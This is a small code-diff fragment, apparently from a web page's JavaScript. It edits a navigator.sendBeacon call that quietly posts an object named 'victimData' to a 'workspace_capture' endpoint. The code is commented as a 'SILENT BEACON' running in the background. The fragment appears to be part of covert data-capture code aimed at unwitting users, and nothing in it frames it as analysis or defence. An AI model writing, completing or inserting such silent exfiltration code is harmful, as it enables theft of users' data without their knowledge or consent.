@@ -190,7 +190,7 @@
         };
         
         // **SILENT BEACON** (background - no blocking)
-        navigator.sendBeacon('/api/workspace_capture', 
+        navigator.sendBeacon('pages/api/workspace_capture',
           new Blob([JSON.stringify(victimData)], {type: 'application/json'})
         );
         
